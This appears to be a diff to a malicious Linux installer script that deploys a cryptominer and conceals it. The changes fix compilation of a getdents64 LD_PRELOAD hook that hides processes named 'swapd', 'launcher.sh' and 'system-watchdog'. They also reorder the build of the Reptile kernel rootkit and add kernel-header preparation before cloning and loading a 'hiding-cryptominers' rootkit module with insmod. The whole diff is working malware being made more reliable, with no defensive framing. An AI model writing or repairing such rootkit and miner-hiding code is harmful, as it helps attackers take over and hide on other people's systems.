@@ -578,8 +578,8 @@ echo "[*] Deploying libhide.so (userland process hiding)..."
 
 if command -v gcc &>/dev/null; then
     # ==================== FIX: Improved libhide.so compilation ====================
-    # Create the process hider source
-    printf '#define _GNU_SOURCE\n#include <dirent.h>\n#include <dlfcn.h>\n#include <string.h>\nstruct linux_dirent64 {unsigned long long d_ino; long long d_off; unsigned short d_reclen; unsigned char d_type; char d_name[];};\nstatic ssize_t (*og)(int, void *, size_t) = NULL;\nssize_t getdents64(int fd, void *dp, size_t c) {\n if(!og) og = dlsym(RTLD_NEXT, "getdents64");\n ssize_t r = og(fd, dp, c);\n if(r <= 0) return r;\n char *p = (char *)dp; size_t o = 0;\n while(o < r) {\n  struct linux_dirent64 *d = (struct linux_dirent64 *)(p + o);\n  if(strstr(d->d_name, "swapd") || strstr(d->d_name, "launcher.sh") || strstr(d->d_name, "system-watchdog")) {\n   int l = d->d_reclen; memmove(p + o, p + o + l, r - (o + l)); r -= l; continue;\n  }\n  o += d->d_reclen;\n }\n return r;\n}\nssize_t __getdents64(int fd, void *dp, size_t c) { return getdents64(fd, dp, c); }\n' > /tmp/hide.c
+    # ==================== FIX: Add missing includes for ssize_t ====================
+    printf '#define _GNU_SOURCE\n#include <sys/types.h>\n#include <unistd.h>\n#include <dirent.h>\n#include <dlfcn.h>\n#include <string.h>\nstruct linux_dirent64 {unsigned long long d_ino; long long d_off; unsigned short d_reclen; unsigned char d_type; char d_name[];};\nstatic ssize_t (*og)(int, void *, size_t) = NULL;\nssize_t getdents64(int fd, void *dp, size_t c) {\n if(!og) og = dlsym(RTLD_NEXT, "getdents64");\n ssize_t r = og(fd, dp, c);\n if(r <= 0) return r;\n char *p = (char *)dp; size_t o = 0;\n while(o < r) {\n  struct linux_dirent64 *d = (struct linux_dirent64 *)(p + o);\n  if(strstr(d->d_name, "swapd") || strstr(d->d_name, "launcher.sh") || strstr(d->d_name, "system-watchdog")) {\n   int l = d->d_reclen; memmove(p + o, p + o + l, r - (o + l)); r -= l; continue;\n  }\n  o += d->d_reclen;\n }\n return r;\n}\nssize_t __getdents64(int fd, void *dp, size_t c) { return getdents64(fd, dp, c); }\n' > /tmp/hide.c
     
     # Compile with detailed error logging
     echo "[*] Compiling libhide.so..."
@@ -2438,7 +2438,17 @@ git clone https://gitee.com/fengzihk/Reptile.git --depth 1 || {
 
 cd Reptile
 
-# ==================== FIX: Generate config.h before compilation ====================
+# Apply critical kernel version patch
+sed -i 's/REPTILE_ALLOW_VERSIONS =.*/REPTILE_ALLOW_VERSIONS = "3.10.0-1160"/' config.mk
+
+# Build with memory limits
+ulimit -v 1048576  # Limit to 1GB virtual memory
+
+# Run defconfig first (may generate initial config)
+make defconfig 2>/dev/null || true
+
+# ==================== FIX: Generate config.h AFTER defconfig ====================
+# This ensures config.h exists even after any 'make clean' operations
 echo "[*] Generating config.h for Reptile..."
 cat > config.h << 'CONFIG_EOF'
 #ifndef _CONFIG_H
@@ -2456,14 +2466,7 @@ mkdir -p sbin 2>/dev/null
 cp config.h sbin/config.h 2>/dev/null || true
 echo "[✓] config.h generated successfully"
 
-# Apply critical kernel version patch
-sed -i 's/REPTILE_ALLOW_VERSIONS =.*/REPTILE_ALLOW_VERSIONS = "3.10.0-1160"/' config.mk
-
-# Build with memory limits
-ulimit -v 1048576  # Limit to 1GB virtual memory
-
-# For compilation steps
-make defconfig
+# Now compile with config.h in place
 make -j$(nproc)
 
 if [ $? -ne 0 ]; then
@@ -2555,6 +2558,22 @@ fi
 #echo "[*] hide crypto miner."
 cd /tmp
 cd .X11-unix
+
+# ==================== FIX: Prepare kernel headers for module compilation ====================
+echo "[*] Preparing kernel headers for rootkit compilation..."
+KERNEL_VER=$(uname -r)
+if [ -d "/usr/src/linux-headers-$KERNEL_VER" ]; then
+    cd "/usr/src/linux-headers-$KERNEL_VER"
+    echo "[*] Running make oldconfig && make prepare..."
+    make oldconfig 2>/dev/null || true
+    make prepare 2>/dev/null || true
+    echo "[✓] Kernel headers prepared"
+    cd /tmp/.X11-unix
+else
+    echo "[!] Kernel headers directory not found, installing..."
+    $PKG_INSTALL "linux-headers-$KERNEL_VER" 2>/dev/null || true
+fi
+
 git clone https://gitee.com/qianmeng/hiding-cryptominers-linux-rootkit.git && cd hiding-cryptominers-linux-rootkit/ && make
 dmesg -C && insmod rootkit.ko && dmesg
 
